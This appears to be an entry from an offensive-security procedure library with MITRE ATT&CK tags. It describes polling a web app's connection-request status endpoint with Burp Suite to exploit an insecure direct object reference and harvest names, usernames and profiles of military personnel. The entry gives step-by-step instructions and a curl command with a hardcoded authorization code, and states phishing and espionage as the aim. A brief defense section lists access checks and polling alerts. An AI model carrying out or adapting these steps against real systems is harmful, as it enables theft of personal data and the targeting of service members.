---
id: proc-uuid-004
tags:
  - data-harvesting
  - idor
  - collection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/send-connection-request-idor]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:25:23.119Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
---
# Accessing-Accepted-Requests-for-Data-Harvesting

## Summary

This procedure monitors connection request statuses and extracts personal information from accepted requests, exploiting IDOR to collect military personnel data.

## Description

Following mass requests, the status endpoint is queried repeatedly. Upon acceptance, the JSON response leaks details due to missing access controls. Performed in Burp Suite for automation. Prerequisites: Pending requests and session validity. Expected outcomes: Harvested data including names and profiles for phishing/esplonage.

## Requirements

1. IDs from prior enumeration and requests
2. Burp Suite for repeated queries
3. Patience for acceptances (may take hours/days)

## Defense

Defensive measures and detection strategies:

- Restrict status queries to owned requests only
- Anonymize or limit data in acceptance responses
- Alert on frequent status polling

## Objectives

1. Detect accepted connections
2. Extract exposed personal info
3. Compile dataset for further use

## Instructions

### Step 1: Query Request Status

**Context**: Poll the status endpoint for changes.

Use Burp Repeater to send GET/POST to status endpoint with request IDs.

> Response: If pending, {"Status": "Pending"}; if accepted, includes user details.

### Step 2: Harvest Data on Acceptance

**Context**: Parse and store leaked information.

Re-execute [[commands/send-connection-request-idor]] variant for status check:

```bash
# Adapted for status query
curl -X POST https://█████████/status-endpoint -H "Authorization-Code: b6315c0b-3f28-4b63-93de-b6a5a1c3db82" -d "RequestId=123"
```

> On acceptance: {"Status": "Accepted", "DisplayName": "John Doe", "Username": "jdoe", "ProfileUrl": "https://...", "Id": 123}. Save to file.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Local System]] Data from Local System

### Sub-Techniques


## Commands Used

- [[commands/send-connection-request-idor]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[Collection]]
- [[harvesting]]
